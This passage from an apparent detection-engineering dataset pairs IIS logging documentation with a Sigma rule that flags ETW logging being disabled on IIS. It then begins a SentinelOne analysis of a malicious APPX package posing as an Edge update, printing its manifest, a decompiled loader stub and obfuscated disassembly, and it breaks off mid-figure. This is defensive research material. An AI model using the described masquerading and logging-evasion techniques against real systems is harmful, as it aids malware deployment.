**ServerIP**, **Method**, **UriStem**, **UriQuery**, **TimeTaken**, **HttpStatus**, **Win32Status**, **ServerPort**, **UserAgent**, **HttpSubStatus**, and **Referer**.\n\n> **Note**\n> If the `<logFile>` element is configured in both the `<siteDefaults>` section and in the `<site>` section for a specific site, the configuration in the `<site>` section is used for that site.\n\nIIS 8.5 enables you to log custom fields in addition to the standard logged set. The log file format must be W3C to add custom fields. For more information, see customFields.\n\n## Compatibility\n\n| Version  | Notes                                                                                                                                                                                                                                                                                                                                                                              |\n| -------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| IIS 10.0 | The `<logFile>` element was not modified in IIS 10.0.                                                                                                                                                                                                                                                                                                                              |\n| IIS 8.5  | Added the **flushByEntrycountW3CLog** attribute to specify the number of events to be stored in the buffer before they are flushed to the log file. Added the **logTargetW3C** attribute to specify how logged IIS events are processed. Added the **maxLogLineLength** attribute to specify the maximum length of a line in a log file. Added the `<customFields>` child element. |\n| IIS 8.0  | The **logSiteId** attribute was added to specify the contents of the -sitename field, and **referer** flag was added to the default value of the **logExtFileFlags** attribute.                                                                                                                                                                                                    |\n| IIS 7.5  | The `<logFile>` element was not modified in IIS 7.5.                                                                                                                                                                                                                                                                                                                               |\n| IIS 7.0  | The `<logFile>` element of the `<siteDefaults>` element was introduced in IIS 7.0.                                                                                                                                                                                                                                                                                                 |\n| IIS 6.0  | The `<logFile>` element replaces sections of the logging properties on the IIS 6.0 **IIsWebService** metabase object.                                                                                                                                                                                                                                                              |\n\n## Setup\n\nThe `<logFile>` element is included in the default installation of IIS 7 and later.\n\n## How To\n\n### How to edit the default logging settings for a server\n\n1. Open **Internet Information Services (IIS) Manager**:\n   - If you are using Windows Server 2012 or Windows Server 2012 R2:\n     - On the taskbar, click **Server Manager**, click **Tools**, and then click **Internet Information Services (IIS) Manager**.\n   - If you are using Windows 8 or Windows 8.1:\n     - Hold down the **Windows** key, press the letter **X**, and then click **Control Panel**.\n     - Click **Administrative Tools**, and then double-click **Internet Information Services (IIS) Manager**.\n   - If you are using Windows Server 2008 or Windows Server 2008 R2:\n     - On the taskbar, click **Start**, point to **Administrative Tools**, and then click **Internet Information Services (IIS) Manager**.\n   - If you are using Windows Vista or Windows 7:\n     - On the taskbar, click **Start**, and then click **Control Panel**.\n     - Double-click **Administrative Tools**, and then double-click **Internet Information Services (IIS) Manager**.\n\n2. In the **Connections** pane, click the server name on which you want to configure logging.\n\n3. In the **Home** pane, double-click **Logging**.\n\n   ```image\n   Alt: Screenshot that shows the Server Home pane, with Logging selected.\n   Description: The image depicts a section of the Internet Information Services (IIS) Manager interface, specifically highlighting the 'Logging' option among other administrative tools. The 'Logging' icon is visually emphasized, indicating where users can configure logging settings for web servers. Other adjacent icons related to HTTP settings and filters are also visible, providing context to the server management interface.\n   Transcription: |\n     - Handler Mappings\n     - HTTP Redirect\n     - HTTP Response...\n     - ISAPI Filters\n     - Logging\n   ```\n\n4. In the **Logging** pane, select the log file format in the **Format** box, and then type the path to the directory where you store the log files in the **Directory** box or click **Browse...** to choose the directory in which to store the log files.\n\n   ```image\n   Alt: Screenshot that shows the Logging pane. W 3 C is selected for Format.\n   Description: The image shows a screenshot of the Internet Information Services (IIS) Manager's Logging configuration pane. It displays the section where users can configure how IIS logs requests, with a focus on the log file format setting. The 'Format' dropdown menu is set to 'W3C', indicating that this format is selected for logging web requests.\n   Transcription: |\n     Logging  \n     Use this feature to configure how IIS logs requests.\n     \n     Log File  \n     Format:  \n     W3C\n   ```\n\n5. If you choose to use the W3C log file format:\n   - Click **Select Fields** to choose the types of information to log.\n   - In the **W3C Logging Fields** dialog box, select the check boxes for options you want to log, clear the check boxes for options you do not want to log, and then click **OK**.\n\n   ```image\n   Alt: Screenshot that shows the W 3 C Logging Fields dialog box.\n   Description: The image displays a screenshot of the W3C Logging Fields dialog box in Internet Information Services (IIS) Manager. Various logging options are listed with checkboxes, including fields like 'Date', 'Time', 'Client IP Address', 'User Name', 'Service Name', 'Server Name', 'Server IP Address', and 'Server Port'. The checkboxes indicate which fields can be selected for logging, with some fields checked and others unchecked.\n   Transcription: |\n     W3C Logging Fields\n     - [x] Date ( date )\n     - [x] Time ( time )\n     - [x] Client IP Address ( c-ip )\n     - [x] User Name ( cs-username )\n     - [x] Service Name ( s-sitename )\n     - [ ] Server Name ( s-computername )\n     - [x] Server IP Address ( s-ip )\n     - [ ] Server Port ( s-port )\n   ```\n\n### How to configure ETW or file logging for W3C logs\n\n1. Open **Internet Information Services (IIS) Manager**:\n   - If you are using Windows Server 2012 R2:\n     - On the taskbar, click **Server Manager**, click **Tools**, and then click **Internet Information Services (IIS) Manager**.\n   - If you are using Windows 8.1:\n     - Hold down the **Windows** key, press the letter **X**, and then click **Control Panel**.\n     - Click **Administrative Tools**, and then double-click **Internet Information Services (IIS) Manager**.\n\n2. In the **Connections** pane, expand the server name.\n\n3. In the site's home pane, double-click **Logging**.\n\n4. In the **Logging** home page, for **Log Event Destination**, select **Log file only**, **ETW event only**, or **Both log file and ETW event**.\n\n   ```image\n   Alt: Screenshot that shows the Logging pane. Log file only is selected for Log Event Destination.\n   Description: The image shows a screenshot of the 'Logging' configuration pane in Internet Information Services (IIS) Manager. It displays options for 'Log Event Destination,' highlighting the selection of 'Log file only' as the preferred logging method. The interface features radio buttons for three logging options: 'Log file only,' 'ETW event only,' and 'Both log file and ETW event.' This configuration is relevant for setting up logging for web servers.\n   Transcription: |\n     Log Event Destination  \n     Select the destination where IIS will write logs:  \n     - ● Log file only  \n     - ○ ETW event only  \n     - ○ Both log file and ETW event\n   ```\n\n### How to configure flushing a W3C log by entry count\n\n1. Open **Internet Information Services (IIS) Manager**:\n   - If you are using Windows Server 2012 R2:\n     - On the taskbar, click **Server Manager**, click **Tools**, and then click **Internet Information Services (IIS) Manager**.\n   - If you are using Windows 8.1:\n     - Hold down the **Windows** key, press the letter **X**, and then click **Control Panel**.\n     - Click **Administrative Tools**, and then double-click **Internet Information Services (IIS) Manager**.\n\n2. In the **Connections** pane, select the server, and then double-click **Configuration Editor**.\n\n3. In the **Configuration Editor**, for the **Section**, expand `system.applicationHost`, and then select **sites**.\n\n4. Expand **siteDefaults**, and then expand **logFile**.\n\n5. For **flushByEntryCountW3Clog**, enter the number of events to be stored in the buffer before they are flushed to the log file.\n\n6. In the **Action** pane, click **Apply**.\n\n   ```image\n   Alt: Screenshot that shows the Collection Editor window. In the Properties pane, flush By Entry Count W 3 C Log is selected.\n   Description: The image depicts a screenshot of the Configuration Editor window in Internet Information Services (IIS) Manager. It shows a section titled 'logFile' with various settings related to logging configuration. The setting 'flushByEntryCountW3Clog' is highlighted, indicating its current value of '0'. This image is relevant for understanding how to configure log file settings in IIS, particularly regarding the flushing of W3C logs.\n   Transcription: |\n     logFile\n        customFields\n        customLogPluginClsid\n        directory                %SystemDrive%\\inetpub\\logs\\LogFiles\n        enabled                  True\n        flushByEntryCountW3CLog  0\n        localTimeRollover        True\n        logExtFileFlags          Data\n   ```\n\n### How to configure the maximum log line length\n\n1. Open **Internet Information Services (IIS) Manager**:\n   - If you are using Windows Server 2012 R2:\n     - On the taskbar, click **Server Manager**, click **Tools**, and then click **Internet Information Services (IIS) Manager**.\n   - If you are using Windows 8.1:\n     - Hold down the **Windows** key, press the letter **X**, and then click **Control Panel**.\n     - Click **Administrative Tools**, and then double-click **Internet Information Services (IIS) Manager**.\n\n2. In the **Connections** pane, expand the server, and then double-click **Configuration Editor**.\n\n3. In the **Configuration Editor**, for the **Section**, expand `system.applicationHost`, and then select **sites**.\n\n4. Expand **siteDefaults**, and then expand **logFile**.\n\n5. For **maxLogLineLength**, enter the maximum number of bytes in a single line of a log file.\n\n6. In the **Action** pane, click **Apply**.\n\n   ```image\n   Alt: Screenshot that shows the Collection Editor window. In the Properties pane, max Log Line Length is selected.\n   Description: The image displays a screenshot of the Configuration Editor window in Internet Information Services (IIS) Manager. It shows various settings related to log file configuration for web sites, including parameters like 'enabled', 'flushByEntryCountW3CLog', 'localTimeRollover', 'logExtFileFlags', 'logFormat', 'logSiteId', 'logTargetW3C', and 'maxLogLineLength'. The value for 'maxLogLineLength' is set to 65536, indicating the maximum number of bytes allowed in a single line of a log file.\n   Transcription: |\n     enabled                     True\n     flushByEntryCountW3CLog     0\n     localTimeRollover           False\n     logExtFileFlags             Date,Time\n     logFormat                   W3C\n     logSiteId                   True\n     logTargetW3C                File,ET\n     maxLogLineLength            65536\n   ```\n\n## Configuration\n\n### Attributes\n\n| Attribute                 | Description|\n| ------------------------- ||\n| `customLogPluginClsid`    | Optional string attribute. Specifies the COM object class ID (CLSID) or IDs, in order of precedence, for custom modules.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |\n| `directory`               | Optional string attribute. Specifies the logging directory, where the log file and logging-related support files are stored. The default value is `%SystemDrive%\\inetpub\\logs\\LogFiles`.                                                                                                                                                                                                                                                                                                                                                                                                                            |\n| `enabled`                 | Optional Boolean attribute. Specifies whether logging is enabled (**true**) or disabled (**false**) for a site. **Note:** ASP and ODBC errors are not logged in the IIS log files. The default value is **true**.                                                                                                                                                                                                                                                                                                                                                                                                   |\n| `flushByEntryCountW3CLog` | Optional uint attribute. Specifies the number of events to be stored in the buffer before they are flushed to the log file. A lower number will cause events to be flushed more quickly, at the cost of performance as a result of a greater number of disk operations. Reduce this value for more real-time troubleshooting, increase it for performance. A value of **0** specifies that the flush will occur at the default maximum of 64k. The default value is **0**.                                                                                                                                          |\n| `localTimeRollover`       | Optional Boolean attribute. Specifies whether a new log file is created based on local time or Coordinated Universal Time (UTC). When false, a new log file is created based on UTC. **Note:** Regardless of the setting, the time stamp for each W3C Extended Logging log record is UTC-based. The default value is **false**.                                                                                                                                                                                                                                                                                     |\n| `logExtFileFlags`         | Optional flags attribute. Specifies the categories of information that are written to either the log file (when you use W3C Extended log file format) or to the ODBC data source during logging events for a site. The **logExtFileFlags** attribute can be one or more of the following values. If you specify more than one value, separate them with a comma (,). The default values are **Date**, **Time**, **ClientIP**, **UserName**, **ServerIP**, **Method**, **UriStem**, **UriQuery**, **TimeTaken**, **HttpStatus**, **Win32Status**, **ServerPort**, **UserAgent**, **HttpSubStatus**, and **Referer**. |\n\n### Child Elements\n\n| Element        | Description                                                                                    |\n| -------------- | ---------------------------------------------------------------------------------------------- |\n| <customFields> | Optional element. Specifies the configuration settings for default custom fields in a W3C log. |\n\n### Configuration Sample\n\nThe following configuration sample specifies default `<logFile>` options.\n\n```\n<system.applicationHost>\n   <sites>\n      <siteDefaults>\n         <logFile logFormat=\"W3C\"\n            directory=\"%SystemDrive%\\inetpub\\logs\\LogFiles\"\n            enabled=\"true\">\n            <customFields>\n               <clear/>\n               <add logFieldName=\"ContosoField\" sourceName=\"ContosoSource\"\n                  sourceType=\"ServerVariable\" />\n            </customFields>\n         </logFile>\n      </siteDefaults>\n   </sites>\n</system.applicationHost>\n```\n\n## Sample Code\n\nThe following code samples configure the default `<logFile>` options for IIS 7.\n\n### AppCmd.exe\n\n```\nappcmd.exe set config -section:system.applicationHost/sites /siteDefaults.logFile.enabled:\"True\" /commit:apphost\nappcmd.exe set config -section:system.applicationHost/sites /siteDefaults.logFile.logFormat:\"W3C\" /commit:apphost\nappcmd.exe set config -section:system.applicationHost/sites /siteDefaults.logFile.directory:\"%SystemDrive%\\inetpub\\logs\\LogFiles\" /commit:apphost\n```\n\n> **Note**\n> You must be sure to set the **commit** parameter to **apphost** when you use AppCmd.exe to configure these settings. This commits the configuration settings to the appropriate location section in the ApplicationHost.config file.\n\n### C#\n\n```\nusing System;\nusing System.Text;\nusing Microsoft.Web.Administration;\n\ninternal static class Sample\n{\n   private static void Main()\n   {\n      using (ServerManager serverManager = new ServerManager())\n      {\n         Configuration config = serverManager.GetApplicationHostConfiguration();\n         ConfigurationSection sitesSection = config.GetSection(\"system.applicationHost/sites\");\n         ConfigurationElement siteDefaultsElement = sitesSection.GetChildElement(\"siteDefaults\");\n\n         ConfigurationElement logFileElement = siteDefaultsElement.GetChildElement(\"logFile\");\n         logFileElement[\"logFormat\"] = @\"W3C\";\n         logFileElement[\"directory\"] = @\"%SystemDrive%\\inetpub\\logs\\LogFiles\";\n         logFileElement[\"enabled\"] = true;\n\n         serverManager.CommitChanges();\n      }\n   }\n}\n```\n\n### VB.NET\n\n```\nImports System\nImports System.Text\nImports Microsoft.Web.Administration\n\nModule Sample\n\n   Sub Main()\n      Dim serverManager As ServerManager = New ServerManager\n      Dim config As Configuration = serverManager.GetApplicationHostConfiguration\n      Dim sitesSection As ConfigurationSection = config.GetSection(\"system.applicationHost/sites\")\n      Dim siteDefaultsElement As ConfigurationElement = sitesSection.GetChildElement(\"siteDefaults\")\n\n      Dim logFileElement As ConfigurationElement = siteDefaultsElement.GetChildElement(\"logFile\")\n      logFileElement(\"logFormat\") = \"W3C\"\n      logFileElement(\"directory\") = \"%SystemDrive%\\inetpub\\logs\\LogFiles\"\n      logFileElement(\"enabled\") = True\n\n      serverManager.CommitChanges()\n   End Sub\n\nEnd Module\n```\n\n### JavaScript\n\n```\nvar adminManager = new ActiveXObject('Microsoft.ApplicationHost.WritableAdminManager');\nadminManager.CommitPath = \"MACHINE/WEBROOT/APPHOST\";\nvar sitesSection = adminManager.GetAdminSection(\"system.applicationHost/sites\", \"MACHINE/WEBROOT/APPHOST\");\nvar siteDefaultsElement = sitesSection.ChildElements.Item(\"siteDefaults\");\n\nvar logFileElement = siteDefaultsElement.ChildElements.Item(\"logFile\");\nlogFileElement.Properties.Item(\"logFormat\").Value = \"W3C\";\nlogFileElement.Properties.Item(\"directory\").Value = \"%SystemDrive%\\\\inetpub\\\\logs\\\\LogFiles\";\nlogFileElement.Properties.Item(\"enabled\").Value = true;\n\nadminManager.CommitChanges();\n```\n\n### VBScript\n\n```\nSet adminManager = WScript.CreateObject(\"Microsoft.ApplicationHost.WritableAdminManager\")\nadminManager.CommitPath = \"MACHINE/WEBROOT/APPHOST\"\nSet sitesSection = adminManager.GetAdminSection(\"system.applicationHost/sites\", \"MACHINE/WEBROOT/APPHOST\")\nSet siteDefaultsElement = sitesSection.ChildElements.Item(\"siteDefaults\")\n\nSet logFileElement = siteDefaultsElement.ChildElements.Item(\"logFile\")\nlogFileElement.Properties.Item(\"logFormat\").Value = \"W3C\"\nlogFileElement.Properties.Item(\"directory\").Value = \"%SystemDrive%\\inetpub\\logs\\LogFiles\"\nlogFileElement.Properties.Item(\"enabled\").Value = True\n\nadminManager.CommitChanges()\n```",
    "sigma_rule": {
      "title": "ETW Logging/Processing Option Disabled On IIS Server",
      "id": "a5b40a90-baf5-4bf7-a6f7-373494881d22",
      "status": "experimental",
      "description": "Detects changes to of the IIS server configuration in order to disable/remove the ETW logging/processing option.",
      "references": [
        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/sitedefaults/logfile/"
      ],
      "author": "frack113, Nasreddine Bencherchali",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration|endswith": "@logTargetW3C",
          "OldValue|contains": "ETW"
        },
        "filter_main_etw_added": {
          "NewValue|contains": "ETW"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate administrator activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_logging_etw_disabled.yml"
  },
  "31": {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment\n\n**Date:** July 14, 2022\n\nThis article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps.\n\n- **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package.\n- **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps.\n- **January, 2022:** Malicious Windows Apps in *APPX* format masquerading as critical browser updates were used to drop Magniber ransomware.\n- **February, 2022:** Windows Apps laced with the Electron Bot malware were uploaded to the Microsoft Store, a trusted library of Microsoft-certified packaged Windows Apps.\n\nSince Microsoft’s announcement that Office applications will by default disable the execution of Office macros in the context of documents that originate from untrusted sources, there has been an uptick in malicious actors using alternative mediums for deploying malware such as Windows Apps and Windows shortcut *LNK* files. Despite Microsoft recently rolling back the decision to disable by default Office macro execution, these media complement malicious macros and remain a threat to watch for.\n\nPrevious research on malicious Windows Apps focused on concrete system infections involving particular instances of such Apps. This article complements previous research by taking a generic perspective. I take an *APPX* package that malicious actors have used to deploy malware as a running example and provide:\n\n- A summarizing overview of the layout and content of *APPX* packages (*APPX* packages are structurally very similar to the alternative *MSIX* packages and the two Windows App packaging formats share the same deployment infrastructure).\n- An overview of selected activities that the Windows system conducts when a user installs a malicious *APPX* package.\n\nThis enables a better understanding of what occurs on a system when a user falls prey to an attack that involves a malicious Windows App – from the operating system activities at first user interaction with the file to the malware deployment that the file triggers.\n\nFor Windows to install an *APPX* package, whether malicious or not, the system first has to establish trust in the package. Microsoft provides the Microsoft Store to Windows users as a library of certified packaged Windows Apps. These packages are digitally counter-signed by Microsoft. Windows trusts by default *APPX* packages that originate from the Windows Store. However, when the Windows App sideloading feature is enabled, users can install *APPX* packages that do not originate from the Microsoft Store as well, that is, packages that are not counter-signed by Microsoft. Such are the majority of the malicious *APPX* packages that the security community has observed in attacks.\n\nIn this article, we will dig into how malicious *APPX* packages can be installed on a Windows 10 system, with a focus on how Windows establishes trust in an *APPX* package. I focus on this aspect since trust is a crucial part of the Windows App installation process. This process is what ultimately deploys malware on a system. I will use the malicious *APPX* package *edge_update.appx* (SHA1: *e491af786b5ee3c57920b79460da351ccf8f6f6b*) as a running example.\n\n## What Does a Malicious Windows App Look Like?\n\nThe `edge_update.appx` *APPX* package is signed with a code signing certificate issued to Foresee Consulting Inc. and a root certificate issued by DigiCert Trusted Root G4. Windows systems trust DigiCert root certificates and they are placed in the *Trusted Root Certification Authorities* certificate store.\n\nFigure 1 depicts the certificate chain of the digital signature of `edge_update.appx` before a Certificate Authority revoked the certificate.\n\n```image\nAlt: Figure 1: The certificate chain of the digital signature of *edge_update.appx* prior certificate revocation\nDescription: The image displays a certificate verification path for a digital signature. It shows the hierarchy of the certificate chain, starting from the root certificate 'DigiCert Trusted Root G4,' followed by a code signing certificate issued to 'Foresee Consulting Inc.' The path indicates that the digital signature is authenticated up to a trusted root authority, which is relevant for understanding the trustworthiness of the malicious Windows app discussed in the surrounding text.\nTranscription: |\n  Certificate\n  \n  General\n  Details\n  Certification Path\n  \n  Certification path\n  - DigiCert Trusted Root G4\n    - DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n      - Foresee Consulting Inc.\n```\n\n*APPX* packages are ZIP archive files that store the executable files that implement the packaged Windows App and additional files. Figure 2 depicts the content of `edge_update.appx`. The `eediwjus` directory stores the malicious Windows App that the executable files `eediwjus.exe` and `eediwjus.dll` implement. `eediwjus.exe` is a .NET Windows App (see Figure 3) that invokes the `mhjpfzvitta` function from `eediwjus.dll`. This function executes malicious code that is heavily control-flow obfuscated with unconditional jumps (see Figure 4). The analysis of the malicious code is out of the scope of this article.\n\n```image\nAlt: Figure 2: The content of *edge_update.appx*\nDescription: The image displays a directory listing of files within a malicious APPX package, specifically located in the path `C:\\Users\\<user>\\malicious_appx\\`. It shows the file names, their sizes, and timestamps of last modifications. The top section lists general files associated with the APPX package, including `AppxBlockMap.xml`, `AppxManifest.xml`, and `AppxSignature.p7x`, along with the malicious directory `eediwjus`. The bottom section provides a detailed view of the `eediwjus` directory, listing two executable files: `eediwjus.dll` and `eediwjus.exe`, along with their respective sizes.\nTranscription: |\n  Directory of C:\\Users\\<USER>\\malicious_appx\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55    <DIR>          AppxBlockMap.xml\n  29/12/2022  13:55    <DIR>          AppxManifest.xml\n  29/12/2022  13:55    <DIR>          AppxMetadata\n  30/12/2022  12:47    <DIR>          AppxSignature.p7x\n                 2.439 AppxBlockMap.xml\n                 2.039 AppxManifest.xml\n                 8.342 AppxSignature.p7x\n                 2.216 resources.pri\n                 740  [Content_Types].xml\n                 [...]\n  \n  Directory of C:\\Users\\<USER>\\malicious_appx\\eediwjus\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55         5.632 eediwjus.dll\n  29/12/2021  13:55         3.584 eediwjus.exe\n```\n\n```image\nAlt: Figure 3: The implementation of *eediwjus.exe*\nDescription: The image depicts a code snippet in C# that showcases a class named `eediwjus`. The code includes details such as the class definition, an import statement for a DLL named `eediwjus.dll`, and a method `mhjpfzvitta` that is declared as an external function. The `Main` method initializes a variable `lpBuffer` and calls the external function with this variable as an argument. The snippet is formatted with color coding to indicate different elements of the code, such as keywords and comments.\nTranscription: |\n  namespace eediwjus\n  {\n      // Token: 0x02000002 RID: 2\n      public class eediwjus\n      {\n          // Token: 0x06000001 RID: 1\n          [DllImport(\"eediwjus.dll\")]\n          private static extern void mhjpfzvitta(uint lpBuffer);\n  \n          // Token: 0x06000002 RID: 2 RVA: 0x00000250 File Offset: 0x00000250\n          private static void Main(string[] args)\n          {\n              uint lpBuffer = 5604U;\n              eediwjus.mhjpfzvitta(lpBuffer);\n          }\n      }\n  }\n```\n\n```image\nAlt: Figure 4: Control-flow obfuscated malicious code in *eediwjus.dll*\nDescription: The image displays a snippet of disassembled code, likely from the malicious executable `eediwjus.exe`. It shows various assembly language instructions, including push and jump operations, along with references to memory locations. The code is annotated with comments indicating cross-references to the function `mhjpfzvitta`, which is identified as part of the malicious behavior associated with this executable.\nTranscription: |\n  .text:0000000018000113F loc_18000113F:          ; CODE XREF: mhjpfzvitta+p\n  .text:0000000018000113F     push    rbp\n  .text:00000000180001140 loc_180001140:          ; CODE XREF: .text:00000000180001196\n  .text:00000000180001140     jmp     short loc_180001196\n  .text:00000000180001142 loc_180001142:         \n  .text:00000000180001142     push    r14\n  .text:00000000180001144 loc_180001144:          ; CODE XREF: .text:000000001800011F2\n  .text:00000000180001144     jmp     loc_1800011F2\n  .text:00000000180001146     db      83h, 99h, 21h\n  .text:00000000180001149 loc_18000114C:         \n  .text:0000000018000114C     lea     rdx, [rbp-8]\n  .text:0000000018000114C     jmp     loc_1800011E4\n  .text:00000000180001150     db      0F6h, 92h, 33h\n  .text:00000000180001153     db      7ch, 7dh\n  .text:00000000180001155 loc_18000115A:         \n  .text:0000000018000115A     mov     rbp, rsp\n  .text:0000000018000115D     jmp     short loc_1800011C9\n```\n\nIn addition to the files that implement a Windows App, an *APPX* package stores additional files, such as `AppxManifest.xml`, `AppxBlockMap.xml`, and `AppxSignature.p7x`.\n\n`AppxManifest.xml` is the package manifest, a file in XML (Extensible Markup Language) format that contains the information that Windows needs to deploy, display, and update a Windows App. This includes information about:\n\n- The publisher of the App, where the publisher is the entity that digitally signs the *APPX* package and that is responsible for the development and release of the Windows App.\n- Windows App properties, such as display name and logo.\n- Software dependencies and capabilities: The Windows system controls what system resources a Windows App can access with respect to the capabilities that the publisher has assigned to the App. System resources include the Internet, filesystem locations, and networking. In summary, Windows Apps execute in a sandboxed, access-restricted, environment for security reasons.\n\nFigure 5 depicts the content of `AppxManifest.xml` in the malicious `edge_update.appx`. The publisher of the Windows App is *Foresee Consulting Inc.*, the display name of the App is *Edge Update*, and the App has the capabilities `internetClient` and `runFullTrust`. The `internetClient` capability enables the malicious Windows App to download data from the Internet, probably a payload from an attacker-controlled endpoint.\n\n```image\nAlt: Figure 5: The content of *AppxManifest.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays the content of the `AppxManifest.xml` file from the malicious `edge_update.appx` package. It includes XML code detailing the identity of the application, which is signed by Foresee Consulting Inc. The display name of the app is 'Edge Update', and it outlines several properties such as publisher information, version details, and resource requirements. Additionally, it highlights the app's capabilities, specifically 'internetClient' and 'runFullTrust', indicating that the application can access the internet and has full trust permissions within the Windows environment.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <Package xmlns=\"http://schemas.microsoft.com/appx/manifest/foundation/windows10\">\n    <Identity Name=\"3669e262-ec02-4e9d-bcbd-3d088b4afac9\" Publisher=\"CN=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1040913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization\" Version=\"96.0.1072.0\" ProcessorArchitecture=\"neutral\" />\n    <Properties>\n      <DisplayName>Edge Update</DisplayName>\n      <PublisherDisplayName>Microsoft Inc</PublisherDisplayName>\n      <Logo>Images\\StoreLogo.png</Logo>\n    </Properties>\n    <Dependencies>\n      <TargetDeviceFamily Name=\"Windows.Universal\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n      <TargetDeviceFamily Name=\"Windows.Desktop\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n    </Dependencies>\n    <Resources>\n      <Resource Language=\"EN-US\" />\n    </Resources>\n    <Applications>\n      <Application Id=\"App\" Executable=\"eediwjus.exe\" EntryPoint=\"Windows.FullTrustApplication\">\n        <uap:SplashScreen Image=\"Images\\SplashScreen.png\" />\n        <uap:LockScreen BadgeLogo=\"Images\\BadgeLogo.png\" Notification=\"badgeAndTileText\" />\n      </Application>\n    </Applications>\n    <Capabilities>\n      <Capability Name=\"internetClient\" />\n      <rescap:Capability Name=\"runFullTrust\" />\n    </Capabilities>\n  </Package>\n```\n\n`AppxBlockMap.xml` is the package block map, a file in XML format that stores Base-64 encoded hash values of data blocks in the files that an *APPX* package archives. Windows uses these hashes to verify the data integrity of these files when installing an *APPX* package, a topic that I discuss further in this article.\n\nFigure 6 depicts the content of `AppxBlockMap.xml` in the malicious `edge_update.appx`. The `HashMethod` XML attribute specifies the hash algorithm for calculating the data block hash values in `AppxBlockMap.xml`. The `File` XML element specifies a file in the *APPX* package and the size of the file. The `Block` XML element specifies the hash value and the size of a single data block in the file. For example, a data block in `eediwjus.exe` that is 1304 bytes big has the SHA-256 hash value of *ad4f74c0c3ac37e6f1cf600a96ae203c38341d263dbac0741e602686794c4f5a* (in hexadecimal format).\n\n```image\nAlt: Figure 6: The content of *AppxBlockMap.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays an XML structure representing the content of an *AppxBlockMap.xml* file from a malicious APPX package named `edge_update.appx`. It includes elements such as `HashMethod`, which specifies the hash algorithm used, and multiple `File` elements detailing individual files within the package. Each `File` entry lists attributes such as `File Name`, `Size`, and a corresponding `Block Hash`, which provides the SHA-256 hash of specific data blocks in the file.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n  <BlockMap xmlns=\"http://schemas.microsoft.com/appx/2010/blockmap\" HashMethod=\"http://www.w3.org/2001/04/xmlenc#sha256\">\n    <File Name=\"eediwjus\\eediwjus.exe\" Size=\"3584\" LfhSize=\"51\">\n      <Block Hash=\"ru90WOsNh+bz2AK2lq4gPDg8H5YusB0HmAmhnIM1Io=\" Size=\"1304\"/>\n    </File>\n    <File Name=\"eediwjus\\eediwjus.dll\" Size=\"5632\" LfhSize=\"51\">\n      <Block Hash=\"9C0gbarmyAq2IwgfMgfef+MUu1Up14eJ3YarNeRsY=\" Size=\"4280\"/>\n    </File>\n    <File Name=\"resources.pri\" Size=\"2216\" LfhSize=\"43\"/>\n    <File Name=\"AppxManifest.xml\" Size=\"2039\" LfhSize=\"46\">\n      <Block Hash=\"kMExXuwujmFwXpesPEI17NjZsArZfVULhB9=\" Size=\"902\"/>\n    </File>\n  </BlockMap>\n```\n\n`AppxSignature.p7x` is the *APPX* package signature, a PKCS (Public-Key Cryptography Standards) #7 digital signature data in ASN.1 (Abstract Syntax Notation One) format. `AppxSignature.p7x` stores signature data, such as the certificate chain of the digital signature and the actual signed data. The signed data includes hashes of files in the APPX package, such as `AppxManifest.xml` and `AppxBlockMap.xml`. Figure 7 depicts the formatted content of `AppxSignature.p7x` in the malicious `edge_update.appx`.\n\n```image\nAlt: Figure 7: The content of *AppxSignature.p7x* in *edge_update.appx* (trimmed for brevity)\nDescription: The image shows the structured content of a digital signature in ASN.1 format, specifically detailing the certificate chain related to the `edge_update.appx` APPX package. It includes sequences with object identifiers for various components such as the signature algorithm (SHA-256), the signing context for Microsoft code signing, and the common names of the involved entities: DigiCert Trusted Root G4 and Foresee Consulting Inc. This representation is crucial for understanding the security validations tied to the digital signature of malicious Windows applications.\nTranscription: |\n  SEQUENCE (2 elem)\n      OBJECT IDENTIFIER 1.2.840.113549.1.7.2 signedData (PKCS #7)\n      [0] (0 elem)\n  SEQUENCE (5 elem)\n      INTEGER 1\n      SET (1 elem)\n          SEQUENCE (2 elem)\n              OBJECT IDENTIFIER 2.16.840.1.101.3.4.2.1 sha-256 (NIST Algorithm)\n              NULL\n      SEQUENCE (2 elem)\n          OBJECT IDENTIFIER 1.3.6.1.4.1.311.2.1.4 spcIndirectDataContext (Microsoft code signing)\n          [0] (1 elem)\n              OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted Root G4\n          